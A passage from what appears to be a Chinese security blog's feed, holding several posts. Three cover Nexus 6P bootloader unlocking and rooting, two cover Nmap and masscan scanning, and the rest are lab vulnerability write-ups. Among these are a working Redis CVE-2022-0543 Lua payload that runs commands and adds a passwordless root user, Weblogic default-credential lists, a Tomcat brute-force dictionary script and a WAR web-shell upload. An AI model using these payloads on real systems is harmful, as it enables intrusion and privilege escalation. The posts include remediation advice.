        <content type="html"><![CDATA[<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/weixin_42282189/article/details/121940142">https://blog.csdn.net/weixin_42282189/article/details/121940142</a></p><p><a href="https://blog.csdn.net/qq1337715208/article/details/115922514">https://blog.csdn.net/qq1337715208/article/details/115922514</a></p><h3 id="回刷官方镜像"><a href="#回刷官方镜像" class="headerlink" title="回刷官方镜像"></a>回刷官方镜像</h3><p>由于之前刷ROOT失败了，得到一个root环境的半成品</p><p>所以这次除了要刷一个正常的root环境之外，还要在这之前先把办成Root给回刷成官方原版镜像</p><p>回刷主要参考这个链接</p><p><a href="https://blog.csdn.net/weixin_42282189/article/details/121940142">https://blog.csdn.net/weixin_42282189/article/details/121940142</a></p><p>官网下载官方镜像</p><p><a href="https://developers.google.cn/android/ota?hl=zh-cn#angler">https://developers.google.cn/android/ota?hl=zh-cn#angler</a></p><p>选”angler” for Nexus 6P中的angler-opm7.181205.001-factory-b75ce068.zip线刷包</p><p>建议按f12，复制包名到代码中区搜，可以直接找到链接，我这里也直接贴出链接，但官方可能会更新导致失效</p><p><a href="https://dl.google.com/dl/android/aosp/angler-ota-opm7.181205.001-abb36a2f.zip?hl=zh-cn">https://dl.google.com/dl/android/aosp/angler-ota-opm7.181205.001-abb36a2f.zip?hl=zh-cn</a></p><p>然后解压该包</p><p>包内会有一些镜像文件，以及flash-all.bat这些批处理文件，是windows就用flash-all.bat，linux就用flash-all.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flash-all.bat</span><br></pre></td></tr></table></figure><p>运行过后，脚本会进入等待状态，显示如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; waiting for any device &gt;</span><br></pre></td></tr></table></figure><p>此时按手机电源键+音量下键，进入fastboot模式脚本就会帮你自动刷机，完成后就是一个崭新的官方镜像了</p><p>使用这个办法，可以无限次将刷坏的root环境重置到官方原版，哪怕刷成无限重启的半砖机，也可以通过该种方法回退，刷机保险程度大大提升</p><h3 id="修补boot-img刷root"><a href="#修补boot-img刷root" class="headerlink" title="修补boot.img刷root"></a>修补boot.img刷root</h3><p>把线刷包中的boot.img发送到手机，可以用adb命令push到手机sdcard目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push boot.img /sdcard/</span><br></pre></td></tr></table></figure><p>然后在手机中下载一个最新版magisk，可以在github中下载</p><p><a href="https://github.com/topjohnwu/Magisk/releases">https://github.com/topjohnwu/Magisk/releases</a></p><p>然后使用adb命令把apk文件安装到手机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install Magisk-25.1.apk</span><br></pre></td></tr></table></figure><p>打开Magisk文件，点击安装</p><p>选项选：保持强制加密（默认选中），修补boot镜像中的vbmeta，这两个，然后下一步</p><p>选：选择并修补一个文件</p><p>然后选择你保存到手机中的boot.img文件，该文件会生成一个magisk_patched-打头的镜像文件，类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magisk_patched-25100_r0fpc.img</span><br></pre></td></tr></table></figure><p>把该文件pull到你的电脑上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /sdcard/Download/magisk_patched-25100_r0fpc.img</span><br></pre></td></tr></table></figure><p>然后重启手机到fastboot模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure><p>刷入你刚pull到电脑上的修补后镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash boot magisk_patched-25100_r0fpc.img</span><br></pre></td></tr></table></figure><p>刷完后等待个10秒左右，重启（有些会自动重启）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure><p>重启成功后，就可以使用adb shell检查一下是否root成功了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br></pre></td></tr></table></figure><p>如果su命令能执行成功，就说明root完成</p><p>如果不成功，请重复回刷官方镜像步骤，还原你的手机系统到官方镜像，然后尝试找出你刷机过程中有无误操作，或使用其他刷机方法。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HUAWEI-Nexus6P刷入第三方rec</title>
      <link href="/2022/07/06/HUAWEI-Nexus6P%E5%88%B7%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9rec/"/>
      <url>/2022/07/06/HUAWEI-Nexus6P%E5%88%B7%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9rec/</url>
      
        <content type="html"><![CDATA[<h3 id="注！！！！！！！"><a href="#注！！！！！！！" class="headerlink" title="注！！！！！！！"></a>注！！！！！！！</h3><p><strong>这个最终失败了，虽然设备root了，但是有问题，使用adb连接并su提升权限会卡死。</strong></p><p><strong>本文章仅做记录，不要学！！！</strong></p><p><strong>不要学！！！</strong></p><p><strong>不要学！！！</strong></p><p><strong>不要学！！！</strong></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://zhuanlan.zhihu.com/p/469514778">https://zhuanlan.zhihu.com/p/469514778</a></p><p><a href="https://blog.csdn.net/liuxinfa/article/details/82878816">https://blog.csdn.net/liuxinfa/article/details/82878816</a></p><p><a href="https://blog.csdn.net/weixin_44183483/article/details/119330911">https://blog.csdn.net/weixin_44183483/article/details/119330911</a></p><p><a href="https://blog.csdn.net/weixin_42282189/article/details/121940142">https://blog.csdn.net/weixin_42282189/article/details/121940142</a></p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p>准备platform-tools工具包，下载链接如下</p><p><a href="https://dl.google.com/android/repository/platform-tools-latest-windows.zip">https://dl.google.com/android/repository/platform-tools-latest-windows.zip</a></p><p>MAC版本</p><p><a href="https://dl.google.com/android/repository/platform-tools-latest-darwin.zip">https://dl.google.com/android/repository/platform-tools-latest-darwin.zip</a></p><p>Linux版本</p><p><a href="https://dl.google.com/android/repository/platform-tools-latest-linux.zip">https://dl.google.com/android/repository/platform-tools-latest-linux.zip</a></p><p>然后下载twrp第三方rec包，下载链接如下</p><p><a href="https://dl.twrp.me/angler/">https://dl.twrp.me/angler/</a></p><p>我根据自己的nexus6P版本选择twrp-2.8.7.2-angler.img镜像</p><p>把下载好的twrp-2.8.7.2-angler.img镜像文件拖到上面下载好的platform-tools工具包解压目录内，使用如下命令刷入rec镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot.exe flash recovery twrp-2.8.7.2-angler.img</span><br></pre></td></tr></table></figure><p>这个时候一直卡在&lt; waiting for any device &gt;界面不动</p><p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706130039592.png" alt="image-20220706130039592"></p><p>这是因为fastboot需要在bootloader模式下才能检测到设备</p><p>使用如下命令重启手机，以bootloader模式开机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure><p>然后再执行刷入rec镜像的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot.exe flash recovery twrp-2.8.7.2-angler.img</span><br></pre></td></tr></table></figure><p>出现okay表示成功</p><p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706163005456.png" alt="image-20220706163005456"></p><p>然后点击音量下键两下，会发现按钮上的文字变成了红色，点击红色按钮进入twrp第三方recovery界面</p><p>这里会让你输入一个密码，但有时候会发现，即使输入了正确的密码也不能访问data分区，即&#x2F;sdcard目录下的内容，于是就需要点cancle取消，然后滑动滑块进入twrp主界面，点wipe（清除），点data format（格式化data分区）</p><p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706163633530.png" alt="image-20220706163633530"></p><p>输入yes同意格式化，格式化成功后不要重启，一直点返回键回退到twrp主界面，这个时候再访问&#x2F;sdcard就可以读到数据了（但这个时候所有数据都被格式化了，因此 要重新用adb把你的magisk刷机包传进来）</p><p>下载magisk刷机包</p><p><a href="https://github.com/topjohnwu/Magisk/releases">https://github.com/topjohnwu/Magisk/releases</a></p><p>我依据我的手机版本，选择了Magisk-v23.0.apk</p><p>下好后把Magisk-v23.0.apk改成Magisk-v23.0.zip</p><p>然后使用命令把Magisk-v23.0.zip传到手机&#x2F;sdcard目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push Magisk-v23.0.zip /sdcard/Magisk-v23.0.zip</span><br></pre></td></tr></table></figure><p>通过twrp主界面的install（安装）访问&#x2F;sdcard目录，点击Magisk-v23.0.zip安装</p><p>安装好后直接Reboot System重启即可</p><p>重启后发现Magisk Manager已经作为系统App安装好了</p><p>然后使用adb进入手机的shell，获取root权限</p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 1.移动安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HUAWEI-Nexus6P解BL锁</title>
      <link href="/2022/07/06/HUAWEI-Nexus6P%E8%A7%A3BL%E9%94%81/"/>
      <url>/2022/07/06/HUAWEI-Nexus6P%E8%A7%A3BL%E9%94%81/</url>
      
        <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.netded.com/a/jingpinshouji/2015/0622/30663.html">https://www.netded.com/a/jingpinshouji/2015/0622/30663.html</a></p><h3 id="注"><a href="#注" class="headerlink" title="注"></a>注</h3><p>解BL锁会导致手机重置，请备份好数据</p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p>手机连数据线，开usb调试、OEM解锁，都在开发者模式里面</p><p>关机，同时按住锁屏键和音量下键，5秒左右会进入BL模式</p><p>去互联网下载解锁工具，链接如下</p><p><a href="http://www.wugfresh.com/nrt/">www.wugfresh.com/nrt/</a></p><p>下载后安装工具，第一次安装后会自动运行解锁工具，或自行在安装目录点击NexusRootToolkit.exe运行</p><p>工具开启后会自动连adb到手机，这个时候USB调试一定得是打开的</p><p>连通后选一下自己手机对应版本，nexus6p，build不知道直接选any就行，安卓版本是多少不用在意</p><p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706111516613.png" alt="image-20220706111516613"></p><p>然后点unlock</p><p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706111634524.png" alt="image-20220706111634524"></p><p>慢慢点确定，看到手机画面变了之后，不要点YES，直接点电源键（别按错），就会自动开始unlock</p><p>然后解锁完成，重启的时候注意开机动画，Google的Logo下会有一个锁的标志，就证明解锁成功</p><p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706111847393.png" alt="image-20220706111847393"></p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 1.移动安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic:控制台默认口令</title>
      <link href="/2022/07/05/Weblogic-%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9A%B4%E9%9C%B2/"/>
      <url>/2022/07/05/Weblogic-%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9A%B4%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p><a href="http://127.0.0.1:7001//console%E7%AD%89%E7%B1%BB%E4%BC%BC%E9%93%BE%E6%8E%A5%E8%AE%BF%E9%97%AE%E5%88%B0%E6%8E%A7%E5%88%B6%E5%8F%B0">http://127.0.0.1:7001//console等类似链接访问到控制台</a></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用默认口令字典</p><p>用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line">weblogic</span><br><span class="line">admin</span><br><span class="line">joe</span><br><span class="line">mary</span><br><span class="line">system</span><br><span class="line">wlcsystem</span><br><span class="line">weblogic</span><br><span class="line">wlpisystem</span><br></pre></td></tr></table></figure><p>密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">password</span><br><span class="line">weblogic</span><br><span class="line">security</span><br><span class="line">password</span><br><span class="line">password</span><br><span class="line">security</span><br><span class="line">wlcsystem</span><br><span class="line">Oracle@123</span><br><span class="line">wlpisystem</span><br></pre></td></tr></table></figure><p>使用burpsuite的pitchfork模式爆破，即用户名密码成对方式爆破，以上文默认口令为例，会以如下用户名密码组合爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system:password</span><br><span class="line">weblogic:weblogic</span><br><span class="line">admin:security</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1，更改weblogic默认口令</p><p>2，尽量避免将weblogic后台向公网开放</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://zhuanlan.zhihu.com/p/414125709">https://zhuanlan.zhihu.com/p/414125709</a></p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 3.已知漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nmap:批量端口扫描</title>
      <link href="/2022/07/01/Nmap-%E6%89%B9%E9%87%8F%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
      <url>/2022/07/01/Nmap-%E6%89%B9%E9%87%8F%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/qq_45300786/article/details/120139192">https://blog.csdn.net/qq_45300786/article/details/120139192</a></p><h3 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h3><p>在针对搜集到的大量IP地址进行端口扫描的场景下，可以使用以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sS -Pn --open -T4  -iL ip.txt -oX res.xml</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了；</span><br><span class="line">-Pn： 禁用PING检测，这样速度快，并且可以防止有些主机无法ping通而被漏掉不扫描；</span><br><span class="line">-n： 不解析域名，加快扫描速度</span><br><span class="line">–open： 只输出检测状态为open的端口，即开放的端口；</span><br><span class="line">-T4：总共有T0-T5，貌似T4比较折中</span><br><span class="line">-iL：载入ip段文件，批量扫，不用一条条执行了。</span><br><span class="line">-oX：结果另存在xxx.xml格式</span><br></pre></td></tr></table></figure><p>下载完后会得到一个存放结果的xml文件，可以用自动化脚本处理这个文件，将它转换成我们熟悉的xls表格格式</p><p>脚本下载地址</p><p><a href="https://github.com/mrschyte/nmap-converter">https://github.com/mrschyte/nmap-converter</a></p><p>脚本安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt//windows安装它的第一个模块好像安装不成功，我使安装到了kali上</span><br></pre></td></tr></table></figure><p>脚本使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 nmap-converter.py -o result.xls res.xml//result.xls是最终结果，res.xml是nmap最初导出的结果文件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 1.工具总结 </category>
          
          <category> 1.信息收集工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>masscan批量端口扫描工具</title>
      <link href="/2022/07/01/masscan%E6%89%B9%E9%87%8F%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"/>
      <url>/2022/07/01/masscan%E6%89%B9%E9%87%8F%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/qq_33608000/article/details/124831900">https://blog.csdn.net/qq_33608000/article/details/124831900</a></p><h3 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h3><p>按文件扫描，扫top1000端口，并且导出为xls文件，并设置线程数为默认（100）10倍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -iL ip.txt -oL res.xls --top-ports 1000 --rate 1000</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 1.工具总结 </category>
          
          <category> 1.信息收集工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis:CVE-2022-0543-Lua沙盒绕过</title>
      <link href="/2022/06/30/Redis-CVE-2022-0543-Lua%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/"/>
      <url>/2022/06/30/Redis-CVE-2022-0543-Lua%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2.2 &lt;= redis &lt; 5.0.13</span><br><span class="line">2.2 &lt;= redis &lt; 6.0.15</span><br><span class="line">2.2 &lt;= redis &lt; 6.2.5</span><br><span class="line">仅debian版与ubuntu版受影响</span><br><span class="line">redis存在未授权</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>redis-cli连接未授权redis数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h [ip] -p [port]</span><br></pre></td></tr></table></figure><p>执行如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;uname -a&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);</span><br><span class="line">local io = io_l();</span><br><span class="line">local f = io.popen(&quot;id&quot;, &quot;r&quot;);</span><br><span class="line">local res = f:read(&quot;*a&quot;);</span><br><span class="line">f:close();</span><br><span class="line">return res</span><br></pre></td></tr></table></figure><p>通过这个思路，还可以利用获得的io库往&#x2F;etc&#x2F;passwd写一个无密码root用户rootx，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);</span><br><span class="line">local io = io_l();</span><br><span class="line">local file = io.open(&quot;/etc/passwd&quot;, &quot;a&quot;)</span><br><span class="line">file:write(&quot;rootx::0:0::/root:/bin/bash\n&quot;)</span><br><span class="line">file:close()</span><br></pre></td></tr></table></figure><p>封装成redis命令行执行的payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local file = io.open(&quot;/etc/passwd&quot;, &quot;a&quot;);file:write(&quot;rootx::0:0::/root:/bin/bash\n&quot;);file:close(); return 0&#x27; 0</span><br></pre></td></tr></table></figure><p>还可以利用网上的自动化工具自动检测</p><p><a href="https://github.com/aodsec/CVE-2022-0543">https://github.com/aodsec/CVE-2022-0543</a></p><p>利用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2022-0543.py</span><br><span class="line">命令行&gt;&gt;127.0.0.1</span><br><span class="line">命令行&gt;&gt;6379</span><br><span class="line">命令行&gt;&gt;whoami</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1，升级redis软件包到更高版本，或在 Lua 初始化的末尾添加package&#x3D;nil</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.cnblogs.com/h0cksr/p/16189735.html">https://www.cnblogs.com/h0cksr/p/16189735.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 3.已知漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat:口令可爆破</title>
      <link href="/2022/06/29/Tomcat-%E5%8F%A3%E4%BB%A4%E5%8F%AF%E7%88%86%E7%A0%B4/"/>
      <url>/2022/06/29/Tomcat-%E5%8F%A3%E4%BB%A4%E5%8F%AF%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>&#x2F;manager&#x2F;html登录界面抓包，观察有Authorization: Basic YWRtaW46YWRtaW4&#x3D;等样式字符，解码base64字符串可得到  用户名:密码  格式字符串。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用脚本把弱用户名（tomcat必须带上），弱密码以   用户名:密码   的方式组合在一起，如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tomcat:tomcat</span><br><span class="line">tomcat:123456</span><br><span class="line">admin:123456</span><br></pre></td></tr></table></figure><p>组合脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 字典处理，把字典处理成 user:password 的格式</span><br><span class="line">def dictHandle(userFile, passFile):</span><br><span class="line">    with open(&#x27;dict_new.txt&#x27;, &#x27;w&#x27;) as new:</span><br><span class="line">        with open(userFile, &#x27;r&#x27;) as user:</span><br><span class="line">            for u in user:</span><br><span class="line">                u = u.rstrip(&#x27;\n&#x27;)</span><br><span class="line">                print(u)</span><br><span class="line">                with open(passFile, &#x27;r&#x27;) as passwd:</span><br><span class="line">                    for p in passwd:</span><br><span class="line">                        new.write(u+&#x27;:&#x27;+p)</span><br><span class="line"></span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 主函数，接收userFile和passFile参数</span><br><span class="line">def main():</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;dictHandle [user] and [pass] to [user:pass].&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--userFile&#x27;, help=&#x27;user file&#x27;, required=True)</span><br><span class="line">    parser.add_argument(&#x27;--passFile&#x27;, help=&#x27;pass file&#x27;, required=True)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    dictHandle(args.userFile, args.passFile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>将组合好的字典文本，导入burp中爆破，并对每条字符串附加base64加密设置。</p><p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220629150416660.png" alt="image-20220629150416660"></p><p>设置自动base64加密</p><p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220629150631620.png" alt="image-20220629150631620"></p><p>爆破效果如图</p><p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220629151735862.png" alt="image-20220629151735862"></p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 3.已知漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat:弱口令&amp;war后门上传</title>
      <link href="/2022/06/28/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-war%E5%90%8E%E9%97%A8%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/06/28/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-war%E5%90%8E%E9%97%A8%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>tomcat后台存在war包上传功能</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>构建war包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar.exe cvf test.war shell.jsp</span><br></pre></td></tr></table></figure><p>tomcat&#x2F;tomcat默认口令进入后台</p><p>后台war包上传功能点，上传构建好的test.war，Deploy按钮上传war包并在后台自动解压</p><p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220628222749020.png" alt="image-20220628222749020"></p><p>冰蝎连接地址<a href="http://123.58.236.76:59836/test/shell.jsp">http://123.58.236.76:59836/test/shell.jsp</a>      getshell</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1，更改tomcat默认口令</p><p>2，移除war包上传功能。</p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 3.已知漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
